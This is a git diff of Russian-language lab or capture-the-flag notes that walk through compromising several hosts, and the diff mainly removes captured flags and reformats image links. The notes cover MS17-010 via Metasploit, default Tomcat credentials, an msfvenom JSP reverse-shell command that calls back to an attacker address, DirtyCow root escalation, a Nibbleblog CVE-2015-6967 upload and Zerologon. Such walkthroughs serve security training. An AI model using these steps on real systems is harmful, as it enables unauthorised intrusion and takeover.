@@ -42,31 +42,31 @@ Host script results:
 |_    Message signing enabled but not required
 
 Проверяем уязвима ли машина к MS17-010 с помощью nmap --script smb-vuln-ms17-010 192.168.100.7
-![[Pasted image 20250117142216.png]]
-Запускаем msfconsole и находим ms17-010. Производим минимальную настройку и запускаем. Спустя несколько попыток получаем соединение и забираем флаг с рабочего стола Peter![[Pasted image 20250117142413.png]]
-![[Pasted image 20250117142431.png]]
-flag{c6acfd25d389305b9cc20f6568e3bce2}
-![[Pasted image 20250117142359.png]]
+![](../../../attachment/Pasted%20image%2020250117142216.png)
+Запускаем msfconsole и находим ms17-010. Производим минимальную настройку и запускаем. Спустя несколько попыток получаем соединение и забираем флаг с рабочего стола Peter!![](../../../attachment/Pasted%20image%2020250117142413.png)
+![](../../../attachment/Pasted%20image%2020250117142431.png)
+
+
 
 
 ==192.168.100.12== - tomcat
 Заходим на сайт  http://192.168.100.12:8080 и видим что tomcat только что был установлен. Скорее всего пароль остался дефолтным. Перебираем стандартные пароли tomcat и получает доступ (tomcat s3cret)
-![[Pasted image 20250113113119.png]]
+![](../../../attachment/Pasted%20image%2020250113113119.png)
 
 Создаем шелл `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -f war > shell.war`
 и затем заливаем его на сайт и переходим http://192.168.100.12:8080/shell/
-Получаем подключение и забираем первый флаг пользователя flag{c351df7d89f09ba2e58e98d2406f7d54} ![[Pasted image 20250113113244.png]]
+Получаем подключение и забираем первый флаг пользователя 
 
 python -c "import pty; pty.spawn('/bin/bash')"
 
 Закидываем на машину DirtyCow и компилируем файл ( О DirtyCow можно узнать с помощью linpeas ил)
-![[Pasted image 20250117215741.png]]
+![](../../../attachment/Pasted%20image%2020250117215741.png)
 Запускаем его и создаем нового пользователя root с паролем hacker
-![[Pasted image 20250117215833.png]]
+![](../../../attachment/Pasted%20image%2020250117215833.png)
 Заходим под новым пользователем и забираем флаг
-![[Pasted image 20250117215922.png]]
 
-flag{5cf994319843b8ca8ea46f615ae32e80}
+
+
 
 ==192.168.100.10,16==
 >[!tip]- nmap
@@ -168,38 +168,38 @@ Host script results:
 
 ==192.168.100.24==
 Через ffuf находим страницы admin и update
-![[Pasted image 20250117192249.png]]
+![](../../../attachment/Pasted%20image%2020250117192249.png)
 
 На странице admin подбираем пароль и логин (admin admin) и получаем доступ к кабинету админа
 На странице update узнаем версию Nibbleblog 4.0.3
-![[Pasted image 20250117192400.png]]
+![](../../../attachment/Pasted%20image%2020250117192400.png)
 Воспользуемся  CVE-2015-6967 которая загружает наш payload php по адресу content/private/plugins/my_image/image.php
-![[Pasted image 20250117192554.png]]
+![](../../../attachment/Pasted%20image%2020250117192554.png)
 
 И получаем страницу со строкой для команд в которой прописываем shell 
-![[Pasted image 20250117192650.png]]
+![](../../../attachment/Pasted%20image%2020250117192650.png)
 
-Получаем доступ, делаем стабильный шелл и получаем первый флаг user flag{6d6c8c5b880f4017d36ac79963d5be0c}
+Получаем доступ, делаем стабильный шелл и получаем первый флаг user 
 
-![[Pasted image 20250117192803.png]]
-![[Pasted image 20250117192814.png]]
 
-Проверяем sudo и видим что можем использовать sudo без пароля. Читаем флаг в директории root flag{eec8bcb745ff86fba3b662e5c22ff609}
+![](../../../attachment/Pasted%20image%2020250117192814.png)
 
-![[Pasted image 20250117192906.png]]
-![[Pasted image 20250117192928.png]]
+Проверяем sudo и видим что можем использовать sudo без пароля. Читаем флаг в директории root 
+
+![](../../../attachment/Pasted%20image%2020250117192906.png)
+
 
 ==192.168.100.20==
 
  проверяем наличие уязвимости nmap --script smb-vuln-ms17-010 192.168.100.20
- ![[Pasted image 20250117200933.png]]
+ ![](../../../attachment/Pasted%20image%2020250117200933.png)
 
   через msfconsole запускаем ms17-010 psexec и получаем доступ под системой
-![[Pasted image 20250117201010.png]]
+![](../../../attachment/Pasted%20image%2020250117201010.png)
 
 Находим файл через search -f *.txt и забираем флаг
-![[Pasted image 20250117201126.png]]
-flag{2027838ae5b03434ee0202a0d785b929}
+
+
 
 ==192.168.100.9==
 admin/dcerpc/cve_2020_1472_zerologon
